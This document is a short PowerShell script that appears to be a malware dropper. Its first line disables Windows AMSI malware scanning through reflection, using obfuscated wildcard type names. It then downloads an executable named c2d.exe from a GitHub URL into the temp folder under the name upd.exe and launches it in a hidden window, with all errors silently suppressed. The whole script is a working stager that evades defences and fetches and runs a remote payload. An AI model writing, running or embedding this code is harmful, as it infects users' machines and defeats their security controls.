$a=[Ref].Assembly.GetType('Sys*.Man*.Aut*.Amsi*');if($a){$b=$a.GetField('amsiInitFailed','N,P,S');if($b){$b.SetValue($null,$true)}}
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
try{
  $exe="$env:TEMP\upd.exe"
  (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kai195102/d/main/c2d.exe',$exe)
  if((Get-Item $exe).Length-gt100kb){Start-Process -FilePath $exe -WindowStyle Hidden}
}catch{}
